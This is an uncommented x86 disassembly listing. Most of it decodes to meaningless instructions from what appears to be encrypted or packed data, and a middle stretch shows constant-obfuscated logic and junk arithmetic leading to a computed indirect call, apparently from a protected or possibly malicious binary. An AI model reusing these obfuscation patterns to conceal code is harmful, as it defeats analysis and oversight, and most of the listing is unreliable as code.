  4123fe:	fild   WORD PTR [eax]
  412400:	jmp    0x4123e8
  412402:	mov    al,0xed
  412404:	jecxz  0x4123f0
  412406:	call   0xf01a1aec
  41240b:	les    edi,FWORD PTR [eax-0x27172a05]
  412411:	aad    0xd1
  412413:	fxch   st(4)
  412415:	add    eax,0xcbe9b907
  41241a:	(bad)  
  41241b:	clc    
  41241c:	or     eax,DWORD PTR ds:0xe209e3ff
  412422:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412424:	test   al,0xcf
  412426:	iret   
  412427:	shl    edi,cl
  412429:	enter  0xf6cc,0xcc
  41242d:	sti    
  41242e:	fistp  QWORD PTR [ebx-0x2f3d0204]
  412434:	mov    eax,0x3f5d7f3
  412439:	retf   
  41243a:	neg    al
  41243c:	sti    
  41243d:	clc    
  41243e:	fxch   st(4)
  412440:	cli    
  412441:	shr    DWORD PTR [esi-0x481f0844],1
  412447:	out    0xdb,al
  412449:	in     eax,dx
  41244a:	lock mov dh,0xba
  41244d:	lock mov edx,0xd7d6f7e8
  412453:	aam    0x1
  412455:	fcmovu st,st(0)
  412457:	(bad)  
  412459:	out    0xe1,eax
  41245b:	cli    
  41245c:	or     eax,0xc4e00ec7
  412461:	jecxz  0x412455
  412463:	iret   
  412464:	fsubrp st(0),st
  412466:	mov    ch,0xc6
  412468:	leave  
  412469:	scas   eax,DWORD PTR es:[edi]
  41246a:	jmp    0x412445
  41246c:	mov    ebx,0xd6fa03d2
  412471:	fcom   st(7)
  412473:	cld    
  412474:	repnz cli 
  412476:	(bad)  
  412477:	rcl    edi,cl
  412479:	cli    
  41247a:	add    edi,esi
  41247c:	add    DWORD PTR [eax],eax
  41247e:	iret   
  41247f:	fild   WORD PTR [esi]
  412481:	in     al,0xcc
  412483:	int    0xd0
  412485:	repz aam 0xc6
  412488:	in     al,0xc6
  41248a:	mov    al,0xb0
  41248c:	int3   
  41248d:	mov    ecx,0xe0bbe9e4
  412492:	sar    edx,1
  412494:	push   es
  412495:	mov    ebx,0xe1d6f2d0
  41249a:	jmp    0xfcce:0xdfe6f5fa
  4124a1:	(bad)  
  4124a3:	in     al,0xb7
  4124a5:	fadd   st(1),st
  4124a7:	ret    0xede4
  4124aa:	jmp    0xd1ec:0xe4d7c8c8
  4124b1:	ret    0xd2fd
  4124b4:	test   DWORD PTR [eax],0x7d9c7e3
  4124ba:	mov    esi,0xceead9c8
  4124bf:	cli    
  4124c0:	out    0xed,al
  4124c2:	(bad)  
  4124c3:	mov    bl,0xcb
  4124c5:	leave  
  4124c6:	in     eax,0xc1
  4124c8:	out    0xd7,al
  4124ca:	mov    dl,0xf7
  4124cc:	fcmovnbe st,st(5)
  4124ce:	leave  
  4124cf:	int    0xb9
  4124d1:	ret    
  4124d2:	int3   
  4124d3:	loop   0x4124d4
  4124d5:	rcr    ch,cl
  4124d7:	ror    DWORD PTR [ebx],0x1
  4124da:	shr    dh,0xe2
  4124dd:	leave  
  4124de:	leave  
  4124df:	(bad)  
  4124e1:	in     al,0xc2
  4124e3:	repnz shr esi,cl
  4124e6:	jecxz  0x4124d7
  4124e8:	cli    
  4124e9:	mov    bl,0xe0
  4124eb:	mov    edi,0xcfb9d9b6
  4124f0:	mov    esi,0xd5f2c8ff
  4124f5:	in     al,0xbc
  4124f7:	push   es
  4124f8:	mov    esp,0xa04c2f7
  4124fd:	or     al,0xc4
  4124ff:	stc    
  412500:	loop   0x4124c9
  412502:	mov    dl,0xcd
  412504:	xlat   BYTE PTR ds:[ebx]
  412505:	mov    dl,0xae
  412507:	jecxz  0x4124f6
  412509:	sti    
  41250a:	aam    0xdb
  41250c:	sar    cl,1
  41250e:	shr    ebp,1
  412510:	rcl    ch,1
  412512:	int3   
  412513:	rol    DWORD PTR [edx],1
  412515:	rcr    ebx,0xdd
  412518:	rol    bh,0xfb
  41251b:	(bad)  
  41251c:	leave  
  41251d:	int    0xc4
  41251f:	leave  
  412520:	int    0xec
  412522:	stos   BYTE PTR es:[edi],al
  412523:	fsubrp st(3),st
  412525:	mov    al,0xd7
  412527:	sar    dl,cl
  412529:	mul    eax
  41252b:	cmc    
  41252c:	call   0x31ce101
  412531:	aad    0xfd
  412533:	fcomp  st(4)
  412535:	repz (bad) 
  412537:	sti    
  412538:	(bad)  
  41253b:	inc    BYTE PTR [edx]
  41253d:	or     esp,ecx
  41253f:	lds    eax,FWORD PTR [ebx+eiz*8]
  412542:	int    0xe7
  412544:	iret   
  412545:	aad    0xbc
  412547:	repnz out 0xe6,al
  41254a:	(bad)  
  41254c:	retf   0xd1f0
  41254f:	repnz loope 0x412545
  412552:	clc    
  412553:	hlt    
  412554:	cmc    
  412555:	neg    eax
  412557:	repz div edi
  41255a:	loopne 0x41256b
  41255c:	add    ecx,edi
  41255e:	or     al,0xdb
  412560:	or     edi,ebx
  412562:	mov    esp,0xe9c9acf1
  412567:	in     al,0xf1
  412569:	leave  
  41256a:	mov    ebx,0xddf9dbf9
  41256f:	out    dx,al
  412570:	mov    edi,0xccdfbdf3
  412575:	cmc    
  412576:	fsub   st,st(0)
  412578:	add    al,0xfe
  41257a:	lock stc 
  41257c:	iret   
  41257d:	aad    0xee
  41257f:	std    
  412580:	shl    edi,cl
  412582:	(bad)  
  412583:	mov    cl,0xd0
  412585:	loop   0x412574
  412587:	in     eax,0xe1
  412589:	(bad)  
  41258a:	mov    ch,0xf8
  41258c:	in     eax,dx
  41258d:	in     al,0xe9
  41258f:	iret   
  412590:	aam    0x0
  412592:	add    ah,bh
  412594:	(bad)  
  412596:	(bad)  
  412597:	aam    0xd2
  412599:	cli    
  41259a:	add    edx,ebp
  41259c:	sti    
  41259d:	or     edx,ecx
  41259f:	or     DWORD PTR [esi],eax
  4125a1:	int    0xed
  4125a3:	out    0xcb,al
  4125a5:	call   0xc110dc5e
  4125aa:	out    0xc9,al
  4125ac:	in     eax,0xd2
  4125ae:	repz mov ebp,0xdafadbd9
  4125b4:	rol    BYTE PTR [eax],0xf0
  4125b7:	loope  0x412583
  4125b9:	loope  0x412580
  4125bb:	cld    
  4125bc:	loope  0x412585
  4125be:	or     edi,ebx
  4125c0:	pop    es
  4125c1:	rol    dh,0xc1
  4125c4:	mov    dl,0xe1
  4125c6:	mov    al,0xce
  4125c8:	(bad)  
  4125c9:	loopne 0x412595
  4125cb:	out    0xd9,eax
  4125cd:	(bad)  
  4125cf:	into   
  4125d0:	fcomi  st,st(1)
  4125d2:	add    esi,esi
  4125d4:	lock shr esp,1
  4125d7:	repnz (bad) 
  4125d9:	out    0x3,eax
  4125db:	retf   
  4125dc:	add    esp,edx
  4125de:	or     BYTE PTR [ebx],dl
  4125e0:	pop    es
  4125e1:	lods   al,BYTE PTR ds:[esi]
  4125e2:	mov    bl,0xb1
  4125e4:	repnz repnz mov esi,0xfed6e4eb
  4125ec:	inc    esp
  4125ee:	mov    eax,DWORD PTR [ecx+eax*4]
  4125f1:	mov    DWORD PTR [ebp-0x38],eax
  4125f4:	jmp    0x4125fe
  4125f9:	jmp    0x40d473
  4125fe:	mov    eax,DWORD PTR [ebp-0x2c]
  412601:	mov    ecx,DWORD PTR [ebp-0x3c]
  412604:	xor    ecx,0x75108b5
  41260a:	add    ecx,0x3272fb
  412610:	cmp    eax,ecx
  412612:	jne    0x41262a
  412618:	mov    eax,DWORD PTR [ebp-0x3c]
  41261b:	xor    eax,0x75108b5
  412620:	add    eax,0x3272fb
  412625:	jmp    0x414dde
  41262a:	mov    eax,DWORD PTR [ebp-0x8]
  41262d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412630:	xor    ecx,0x75108b5
  412636:	add    ecx,0x3272fb
  41263c:	cmp    eax,ecx
  41263e:	je     0x41290b
  412644:	lea    eax,[ebp-0x2c]
  412647:	mov    DWORD PTR [ebp-0x13c],eax
  41264d:	mov    eax,DWORD PTR [ebp-0x10]
  412650:	mov    DWORD PTR [ebp-0x138],eax
  412656:	mov    eax,DWORD PTR [ebp+0xc]
  412659:	mov    DWORD PTR [ebp-0x134],eax
  41265f:	mov    eax,DWORD PTR [ebp-0x134]
  412665:	movzx  eax,WORD PTR [eax+0x20]
  412669:	xor    eax,0x8a9a
  41266e:	add    eax,0x3b61
  412673:	movzx  eax,ax
  412676:	mov    DWORD PTR [ebp-0x114],eax
  41267c:	mov    BYTE PTR [ebp-0x85],0x7a
  412683:	lea    eax,[ebp-0x85]
  412689:	mov    DWORD PTR [ebp-0x10c],eax
  41268f:	movzx  eax,BYTE PTR [ebp-0x85]
  412696:	xor    eax,0x83
  41269b:	add    eax,0x8
  41269e:	mov    ecx,DWORD PTR [ebp-0x10c]
  4126a4:	mov    BYTE PTR [ecx],al
  4126a6:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  4126b0:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  4126ba:	mov    eax,DWORD PTR [ebp-0x118]
  4126c0:	xor    eax,0x75108b5
  4126c5:	add    eax,0x3272fb
  4126ca:	mov    DWORD PTR [ebp-0x120],eax
  4126d0:	jmp    0x4126e2
  4126d5:	mov    eax,DWORD PTR [ebp-0x120]
  4126db:	inc    eax
  4126dc:	mov    DWORD PTR [ebp-0x120],eax
  4126e2:	cmp    DWORD PTR [ebp-0x120],0x40
  4126e9:	jae    0x412707
  4126ef:	mov    eax,DWORD PTR [ebp-0x120]
  4126f5:	mov    cl,BYTE PTR [ebp-0x85]
  4126fb:	mov    BYTE PTR [ebp+eax*1-0xc8],cl
  412702:	jmp    0x4126d5
  412707:	mov    eax,DWORD PTR [ebp-0x118]
  41270d:	xor    eax,0x75108b5
  412712:	add    eax,0x3272fb
  412717:	mov    DWORD PTR [ebp-0x124],eax
  41271d:	jmp    0x41272f
  412722:	mov    eax,DWORD PTR [ebp-0x124]
  412728:	inc    eax
  412729:	mov    DWORD PTR [ebp-0x124],eax
  41272f:	mov    eax,DWORD PTR [ebp-0x114]
  412735:	cmp    DWORD PTR [ebp-0x124],eax
  41273b:	je     0x412791
  412741:	mov    eax,DWORD PTR [ebp-0x124]
  412747:	mov    ecx,DWORD PTR [ebp-0x134]
  41274d:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  412752:	xor    eax,0x8a9a
  412757:	add    eax,0x3b61
  41275c:	movzx  eax,ax
  41275f:	mov    DWORD PTR [ebp-0x128],eax
  412765:	mov    eax,DWORD PTR [ebp-0x124]
  41276b:	mov    ecx,DWORD PTR [ebp-0x134]
  412771:	movzx  eax,WORD PTR [ecx+eax*4]
  412775:	xor    eax,0x8a9a
  41277a:	add    eax,0x3b61
  41277f:	mov    ecx,DWORD PTR [ebp-0x128]
  412785:	mov    BYTE PTR [ebp+ecx*1-0xc8],al
  41278c:	jmp    0x412722
  412791:	mov    eax,DWORD PTR [ebp-0x118]
  412797:	xor    eax,0x75108b5
  41279c:	add    eax,0x3272fb
  4127a1:	mov    ecx,DWORD PTR [ebp-0x13c]
  4127a7:	mov    DWORD PTR [ecx],eax
  4127a9:	mov    eax,DWORD PTR [ebp-0x118]
  4127af:	xor    eax,0x75108b5
  4127b4:	add    eax,0x3272fb
  4127b9:	mov    DWORD PTR [ebp-0x110],eax
  4127bf:	mov    DWORD PTR [ebp-0x84],0xf89c95b0
  4127c9:	mov    eax,DWORD PTR [ebp-0x84]
  4127cf:	xor    eax,0x75108b5
  4127d4:	add    eax,0x3272fb
  4127d9:	je     0x4128ee
  4127df:	lea    eax,[ebp-0x130]
  4127e5:	mov    DWORD PTR [ebp-0x12c],eax
  4127eb:	mov    eax,DWORD PTR [ebp-0x110]
  4127f1:	sub    eax,0x3272fb
  4127f6:	xor    eax,0x75108b5
  4127fb:	mov    ecx,DWORD PTR [ebp-0x12c]
  412801:	mov    DWORD PTR [ecx],eax
  412803:	mov    eax,DWORD PTR [ebp-0x84]
  412809:	xor    eax,0x75108b5
  41280e:	add    eax,0x3272fb
  412813:	mov    ecx,DWORD PTR [ebp-0x11c]
  412819:	xor    ecx,0x75108b5
  41281f:	add    ecx,0x3272fb
  412825:	sub    eax,ecx
  412827:	sub    eax,0x3272fb
  41282c:	xor    eax,0x75108b5
  412831:	mov    DWORD PTR [ebp-0x84],eax
  412837:	mov    eax,DWORD PTR [ebp-0x110]
  41283d:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412845:	movsx  ecx,BYTE PTR [ebp-0x85]
  41284c:	cmp    eax,ecx
  41284e:	je     0x4128c6
  412854:	mov    eax,DWORD PTR [ebp-0x110]
  41285a:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412862:	mov    ecx,DWORD PTR [ebp-0x130]
  412868:	xor    ecx,0x75108b5
  41286e:	mov    edx,DWORD PTR [ebp-0x138]
  412874:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fb]
  41287c:	cmp    eax,ecx
  41287e:	je     0x41288e
  412884:	jmp    0x412906
  412889:	jmp    0x4128c6
  41288e:	mov    eax,DWORD PTR [ebp-0x130]
  412894:	xor    eax,0x75108b5
  412899:	mov    ecx,DWORD PTR [ebp-0x138]
  41289f:	movsx  eax,BYTE PTR [ecx+eax*1+0x3272fb]
  4128a7:	mov    ecx,DWORD PTR [ebp-0x118]
  4128ad:	xor    ecx,0x75108b5
  4128b3:	add    ecx,0x3272fb
  4128b9:	cmp    eax,ecx
  4128bb:	jne    0x4128c6
  4128c1:	jmp    0x4128ee
  4128c6:	mov    eax,DWORD PTR [ebp-0x11c]
  4128cc:	xor    eax,0x75108b5
  4128d1:	mov    ecx,DWORD PTR [ebp-0x110]
  4128d7:	lea    eax,[ecx+eax*1+0x3272fb]
  4128de:	mov    DWORD PTR [ebp-0x110],eax
  4128e4:	jmp    0x4127c9
  4128e9:	jmp    0x4127c9
  4128ee:	mov    eax,DWORD PTR [ebp-0x11c]
  4128f4:	xor    eax,0x75108b5
  4128f9:	add    eax,0x3272fb
  4128fe:	mov    ecx,DWORD PTR [ebp-0x13c]
  412904:	mov    DWORD PTR [ecx],eax
  412906:	jmp    0x41023e
  41290b:	mov    eax,DWORD PTR [ebp+0x8]
  41290e:	add    eax,DWORD PTR [ebp-0x38]
  412911:	mov    DWORD PTR [ebp-0x34],eax
  412914:	cmp    DWORD PTR [ebp-0x28],0x0
  412918:	je     0x4129d7
  41291e:	mov    DWORD PTR [ebp-0x4c],0x0
  412925:	push   edx
  412926:	pop    eax
  412927:	push   0x5
  412929:	sub    edx,eax
  41292b:	pop    edx
  41292c:	add    edx,0xa
  41292f:	push   edx
  412930:	pop    ecx
  412931:	push   0xa
  412933:	dec    ecx
  412934:	pop    ebx
  412935:	dec    ebx
  412936:	xchg   ebx,ecx
  412938:	sub    ebx,ecx
  41293a:	xchg   ebx,ecx
  41293c:	dec    ecx
  41293d:	mov    eax,DWORD PTR [ebp-0x28]
  412940:	imul   eax,ecx
  412943:	sub    esp,eax
  412945:	mov    DWORD PTR [ebp-0x4c],esp
  412948:	mov    eax,DWORD PTR [ebp-0x3c]
  41294b:	xor    eax,0x75108b5
  412950:	add    eax,0x3272fb
  412955:	mov    DWORD PTR [ebp-0x48],eax
  412958:	mov    eax,DWORD PTR [ebp-0x3c]
  41295b:	xor    eax,0x75108b5
  412960:	mov    ecx,DWORD PTR [ebp-0x48]
  412963:	lea    eax,[ecx+eax*1+0x3272fb]
  41296a:	mov    ecx,DWORD PTR [ebp-0x40]
  41296d:	xor    ecx,0x75108b5
  412973:	add    ecx,0x3272fb
  412979:	mov    edx,DWORD PTR [ebp+0x14]
  41297c:	imul   ecx,DWORD PTR [edx]
  41297f:	cmp    eax,ecx
  412981:	je     0x4129d7
  412987:	mov    ecx,DWORD PTR [ebp-0x3c]
  41298a:	xor    ecx,0x75108b5
  412990:	mov    esi,DWORD PTR [ebp-0x40]
  412993:	xor    esi,0x75108b5
  412999:	add    esi,0x3272fb
  41299f:	mov    eax,DWORD PTR [ebp-0x48]
  4129a2:	mov    edx,DWORD PTR [ebp+0x14]
  4129a5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4129a9:	xor    edx,edx
  4129ab:	div    esi
  4129ad:	lea    eax,[ecx+eax*1+0x3272fb]
  4129b4:	mov    ecx,DWORD PTR [ebp-0x48]
  4129b7:	mov    edx,DWORD PTR [ebp-0x4c]
  4129ba:	mov    DWORD PTR [edx+ecx*4],eax
  4129bd:	mov    eax,DWORD PTR [ebp-0x40]
  4129c0:	xor    eax,0x75108b5
  4129c5:	mov    ecx,DWORD PTR [ebp-0x48]
  4129c8:	lea    eax,[ecx+eax*1+0x3272fb]
  4129cf:	mov    DWORD PTR [ebp-0x48],eax
  4129d2:	jmp    0x412958
  4129d7:	mov    eax,DWORD PTR [ebp-0x3c]
  4129da:	xor    eax,0x75108b5
  4129df:	add    eax,0x3272fb
  4129e4:	mov    DWORD PTR [ebp-0x1c],eax
  4129e7:	and    ebx,0x76575654
  4129ed:	xor    ebx,0x54354364
  4129f3:	xchg   ebx,esi
  4129f5:	xor    ebx,ebx
  4129f7:	push   esi
  4129f8:	mov    esi,ebx
  4129fa:	pop    ebx
  4129fb:	mov    edx,esi
  4129fd:	add    ebx,0x1002
  412a03:	lea    eax,[ebp-0x34]
  412a06:	add    edx,eax
  412a08:	add    edx,0x5
  412a0b:	push   edx
  412a0c:	inc    esi
  412a0d:	pop    ecx
  412a0e:	dec    ecx
  412a0f:	xchg   ecx,eax
  412a10:	dec    eax
  412a11:	xchg   ecx,eax
  412a12:	dec    ecx
  412a13:	xchg   ecx,edx
  412a15:	dec    edx
  412a16:	push   edx
  412a17:	mov    edx,ebx
  412a19:	pop    ebx
  412a1a:	dec    ebx
  412a1b:	call   DWORD PTR [ebx]
  412a1d:	cmp    DWORD PTR [ebp+0x10],esi
  412a20:	je     0x412a41
  412a26:	xchg   edx,eax
  412a27:	push   0xc
  412a29:	pop    ecx
  412a2a:	dec    ecx
  412a2b:	push   0x3
  412a2d:	pop    ebx
  412a2e:	inc    ebx
  412a2f:	xchg   ebx,ecx
  412a31:	inc    ecx
  412a32:	sub    ebx,ecx
  412a34:	xchg   ebx,ecx
  412a36:	dec    ecx
  412a37:	dec    ecx
  412a38:	mov    eax,DWORD PTR [ebp-0x28]
  412a3b:	imul   eax,ecx
  412a3e:	add    esp,eax
  412a40:	xchg   edx,eax
  412a41:	push   eax
  412a42:	jmp    0x414dcb
  412a47:	ret    0xc368
  412a4a:	ret    
  412a4b:	jno    0x412abd
  412a4d:	ret    0x1568
  412a50:	rcl    BYTE PTR [edx],cl
  412a52:	clc    
  412a53:	mov    ds:0x46344960,al
  412a58:	ins    DWORD PTR es:[edi],dx
  412a59:	jnp    0x412ad6
  412a5b:	out    0x98,eax
  412a5d:	jnp    0x412ada
  412a5f:	int    0xcf
  412a61:	iret   
  412a62:	fcmove st,st(6)
  412a64:	mov    esp,0xe3fbc502
  412a69:	aam    0xf7
  412a6b:	out    dx,eax
  412a6c:	xlat   BYTE PTR ds:[ebx]
  412a6d:	test   BYTE PTR [edx],0xfd
  412a70:	adc    ecx,DWORD PTR [edx]
  412a72:	iret   
  412a73:	jmp    0x412a5b
  412a75:	ret    0xb1f5
  412a78:	(bad)  
  412a79:	iret   
  412a7a:	leave  
  412a7b:	aam    0xf2
  412a7d:	jmp    0x412a3c
  412a7f:	mov    esp,0xf3ceecdc
  412a84:	out    0xc7,eax
  412a86:	in     al,0xf1
  412a88:	repz neg cl
  412a8b:	jmp    0x412a74
  412a8d:	jmp    0xeab8:0xcf08ee0b
  412a94:	shr    BYTE PTR [ebp-0x140f5553],1
  412a9a:	aam    0xe7
  412a9c:	out    dx,al
  412a9d:	mov    ebx,0xbac3fcc9
  412aa2:	xlat   BYTE PTR ds:[ebx]
  412aa3:	rcr    esp,cl
  412aa5:	(bad)  
  412aa6:	in     al,dx
  412aa7:	fst    st(4)
  412aa9:	fdiv   st,st(5)
  412aab:	(bad)  
  412aad:	aad    0xce
  412aaf:	(bad)  
  412ab1:	leave  
  412ab2:	shl    DWORD PTR [ecx-0x1f2f3c1d],1
  412ab8:	loop   0x412a71
  412aba:	hlt    
  412abb:	mov    dh,0xb4
  412abd:	out    dx,eax
  412abe:	int3   
  412abf:	in     al,0xb1
  412ac1:	mov    esp,0xf907d8e0
  412ac6:	pop    es
  412ac7:	sti    
  412ac8:	mov    ebp,0xddd0dbd2
  412acd:	sti    
  412ace:	retf   0xdc06
  412ad1:	or     eax,0xc4f7b0e1
  412ad6:	loop   0x412a98
  412ad8:	out    0xe0,al
  412ada:	mov    ch,0xb2
  412adc:	jmp    0xd03b1e96
  412ae1:	fdivr  DWORD PTR [edi-0x1afe181d]
  412ae7:	rol    esp,cl
  412ae9:	retf   0xc6c4
  412aec:	mov    ebp,0xfc0d0bf8
  412af1:	shl    BYTE PTR [edx-0x111d1f16],cl
  412af7:	into   
  412af8:	in     al,dx
  412af9:	int    0xd5
  412afb:	(bad)  
  412afc:	iret   
  412afd:	jmp    0x7fd:0xdde3cfff
  412b04:	(bad)  
  412b06:	add    eax,0xe9c6d1c2
  412b0b:	add    dl,dh
  412b0d:	jmp    0x412b10
  412b0f:	stc    
  412b10:	cli    
  412b11:	fsubr  DWORD PTR [ebp-0x11314d34]
  412b17:	out    dx,eax
  412b18:	aam    0xf3
  412b1a:	(bad)  
  412b1b:	retf   
  412b1c:	mov    dh,0xde
  412b1e:	repnz mov edi,0xfcd5e8ea
  412b24:	mov    ecx,0xdfd2bfd1
  412b29:	push   es
  412b2a:	add    cl,BYTE PTR [ecx]
  412b2c:	test   BYTE PTR ds:0xa05020a,0xbf
  412b33:	out    0xe3,al
  412b35:	scas   al,BYTE PTR es:[edi]
  412b36:	fdiv   QWORD PTR [edx-0x131f4f11]
  412b3c:	in     al,0xb6
  412b3e:	idiv   ecx
  412b40:	test   DWORD PTR [ecx],0xb8c2b9f8
  412b46:	idiv   al
  412b48:	mov    ecx,0xebfeffe7
  412b4d:	or     eax,0xe03e2fd
  412b52:	ret    
  412b53:	jmp    0x412b18
  412b55:	into   
  412b56:	iret   
  412b57:	shl    ah,cl
  412b59:	mov    bl,0xf7
  412b5b:	int    0xb8
  412b5d:	jmp    0xfee0:0xd7d5fde9
  412b64:	(bad)  
  412b66:	vpsraw ymm0,ymm4,xmm1
  412b6a:	mov    edi,0x3dad7f6
  412b6f:	out    0xdd,eax
  412b71:	add    BYTE PTR [esi-0x483d2c09],ch
  412b77:	mov    al,0xcb
  412b79:	mov    cl,0xcb
  412b7b:	into   
  412b7c:	out    dx,al
  412b7d:	sar    DWORD PTR [edi-0x12240a15],1
  412b83:	rol    BYTE PTR [edi],0xdd
  412b86:	in     al,dx
  412b87:	in     eax,0x2
  412b89:	jecxz  0x412b6b
  412b8b:	vpsubsw xmm5,xmm3,xmm4
  412b8f:	add    DWORD PTR [ebx+esi*8],eax
  412b92:	int    0xbf
  412b94:	in     al,0xaf
  412b96:	leave  
  412b97:	mov    al,0xda
  412b99:	retf   0xe7b5
  412b9c:	clc    
  412b9d:	cmc    
  412b9e:	mov    ebp,0xd0e803ea
  412ba3:	enter  0xd0d8,0xc3
  412ba7:	fstp   st(7)
  412ba9:	in     al,0xbf
  412bab:	cld    
  412bac:	in     al,0xe8
  412bae:	cli    
  412baf:	fucomip st,st(3)
  412bb1:	jmp    0x412b95
  412bb3:	mov    ebp,0xe8b1e4e5
  412bb8:	out    0xd7,eax
  412bba:	(bad)  
  412bbb:	in     al,dx
  412bbc:	repnz clc 
  412bbe:	fst    st(3)
  412bc0:	enter  0xdde9,0xbc
  412bc4:	cli    
  412bc5:	aam    0xc6
  412bc7:	(bad)  
  412bc9:	fcompp 
  412bcb:	in     al,0xd7
  412bcd:	iret   
  412bce:	or     ch,cl
  412bd0:	jmp    0x412be3
  412bd2:	in     eax,0xa9
  412bd4:	mov    al,0xd6
  412bd7:	mov    esp,0xe9b4d5e9
  412bdc:	xlat   BYTE PTR ds:[ebx]
  412bdd:	(bad)  
  412bde:	fidivr WORD PTR [ebx-0x2283628]
  412be4:	int    0xf6
  412be6:	rcl    ch,1
  412be8:	add    eax,0xc4f5d90b
  412bed:	(bad)  
  412bee:	cli    
  412bef:	or     eax,0xcaa703c4
  412bf4:	xlat   BYTE PTR ds:[ebx]
  412bf5:	repz mov dl,0xb7
  412bf8:	shl    BYTE PTR [ebp-0x5082b2b],1
  412bfe:	dec    edx
  412c00:	aad    0xfd
  412c02:	int    0xcd
  412c04:	mov    esp,0xc6f807e3
  412c09:	out    0x9,eax
  412c0b:	sti    
  412c0c:	jmp    0xcf550910
  412c11:	or     ch,cl
  412c13:	test   eax,0xc6e7adb3
  412c18:	(bad)  
  412c19:	int3   
  412c1a:	loope  0x412bd4
  412c1c:	mov    eax,0xe9f5cdcd
  412c21:	std    
  412c22:	mov    ebx,0x7f8ddb6
  412c27:	fadd   DWORD PTR [edx]
  412c29:	idiv   edi
  412c2b:	leave  
  412c2c:	out    dx,eax
  412c2d:	frndint 
  412c2f:	jecxz  0x412c1f
  412c31:	icebp  
  412c32:	(bad)  
  412c33:	in     al,0xc0
  412c35:	shr    ebx,cl
  412c37:	shl    BYTE PTR [edi+ebp*8-0x4b361208],1
  412c3e:	aad    0xd0
  412c40:	jecxz  0x412c16
  412c42:	int3   
  412c43:	mov    esp,0xf6e3fcfb
  412c48:	ret    
  412c49:	fsubr  st(7),st
  412c4b:	in     eax,0xf
  412c4d:	or     ch,ah
  412c4f:	fisttp QWORD PTR [ecx]
  412c51:	fisubr WORD PTR [eax-0x18112c13]
  412c57:	shl    bh,1
  412c59:	(bad)
  412c5c:	out    dx,eax
  412c5d:	rcl    cl,1
  412c5f:	hlt    
  412c60:	std    
  412c61:	dec    eax
  412c63:	loop   0x412c1d
  412c65:	(bad)  
  412c66:	xlat   BYTE PTR ds:[ebx]
  412c67:	int3   
  412c68:	clc    
  412c69:	add    DWORD PTR [eax],ecx
  412c6b:	fsub   st,st(4)
  412c6d:	jmp    0xf442a35
  412c72:	lock ret 0xcfde
  412c76:	iret   
  412c77:	xlat   BYTE PTR ds:[ebx]
  412c78:	hlt    
  412c79:	repz out dx,al
  412c7b:	in     al,0xe5
  412c7d:	div    bl
  412c7f:	cld    
  412c80:	int    0xbf
  412c82:	iret   
  412c83:	clc    
  412c84:	aam    0xd1
  412c86:	bnd jmp 0x412c45
  412c89:	ret    0xd608
  412c8c:	xlat   BYTE PTR ds:[ebx]
  412c8d:	pop    es
  412c8e:	jecxz  0x412c8c
  412c90:	jmp    0xccca:0xcce7ebe5
  412c97:	in     al,0xbb
  412c99:	aam    0xf7
  412c9b:	mov    cl,0xed
  412c9d:	aam    0xf2
  412c9f:	aam    0xd0
  412ca1:	mov    ah,0xb9
  412ca3:	add    BYTE PTR [ecx],al
  412ca5:	push   eax
  412ca7:	xlat   BYTE PTR ds:[ebx]
  412ca8:	aad    0x5
  412caa:	icebp  
  412cab:	test   ebx,0xe5eddbca
  412cb1:	jecxz  0x412c5e
  412cb3:	repnz mov al,0xa8
  412cb6:	cmc    
  412cb7:	in     al,dx
  412cb8:	mov    bl,0xf3
  412cba:	in     eax,0xc0
  412cbc:	enter  0xffed,0xb9
  412cc0:	jmp    0xffe2:0xd5debbbf
  412cc7:	mov    edx,0xd9f0f003
  412ccc:	push   es
  412ccd:	call   0xe2413bd2
  412cd2:	rcl    edx,cl
  412cd4:	out    dx,eax
  412cd5:	xlat   BYTE PTR ds:[ebx]
  412cd6:	leave  
  412cd7:	(bad)  
  412cd8:	lods   al,BYTE PTR ds:[esi]
  412cd9:	iret   
  412cda:	rcl    dl,0xd7
  412cdd:	mov    eax,0xbdccd8cc
  412ce2:	stc    
  412ce3:	fild   WORD PTR [ebx]
  412ce5:	(bad)  
  412ce6:	fsubr  st(4),st
  412ce8:	sti    
  412ce9:	aad    0xe3
  412ceb:	push   es
  412cec:	out    0x9,eax
  412cee:	add    dh,bl
  412cf0:	(bad)  
  412cf2:	fucomp st(7)
  412cf4:	(bad)  
  412cf5:	in     al,0xb3
  412cf7:	(bad)  
  412cf8:	in     al,0xe6
  412cfa:	ror    cl,cl
  412cfc:	mov    eax,0xdaeee8df
  412d01:	aam    0xe1
  412d03:	fcmovbe st,st(0)
  412d05:	out    dx,al
  412d06:	add    eax,ebx
  412d08:	loop   0x412cfe
  412d0a:	icebp  
  412d0b:	(bad)  
  412d0d:	jmp    0xc90ef512
  412d12:	leave  
  412d13:	ret    
  412d14:	scas   eax,DWORD PTR es:[edi]
  412d15:	mov    ebp,0xb6c4f6eb
  412d1a:	in     eax,dx
  412d1b:	retf   0xb5d1
  412d1e:	(bad)  
  412d1f:	fild   DWORD PTR [edx]
  412d21:	jmp    0xd8020c17
  412d26:	cli    
  412d27:	mul    ebx
  412d29:	mov    esp,0xe7e3f9d5
  412d2e:	or     al,0xdc
  412d30:	add    eax,0xa8c9c1d9
  412d35:	test   al,0xdc
  412d37:	sti    
  412d38:	mov    ch,0xe2
  412d3a:	mov    bh,0xe9
  412d3c:	(bad)  
  412d3e:	iret   
  412d3f:	jmp    0x412d12
  412d41:	jmp    0xdf3f0a44
  412d46:	in     al,0xf1
  412d48:	stc    
  412d49:	retf   
  412d4a:	fscale 
  412d4c:	or     cl,ch
  412d4e:	or     dh,ah
  412d50:	int3   
  412d51:	out    0xd9,al
  412d53:	div    edx
  412d55:	shl    bh,cl
  412d57:	lods   al,BYTE PTR ds:[esi]
  412d58:	mov    ah,0xf2
  412d5a:	(bad)  
  412d5b:	enter  0xe8ec,0xb9
  412d5f:	mov    ch,0xf2
  412d61:	lock dec ah
  412d64:	not    dl
  412d66:	sar    ecx,0xd9
  412d69:	in     eax,0xfa
  412d6b:	loope  0x412d37
  412d6d:	paddusw mm6,mm4
  412d70:	in     eax,0x6
  412d72:	repnz (bad) 
  412d74:	(bad)  
  412d76:	mov    esp,0xe1e4d6b5
  412d7b:	stc    
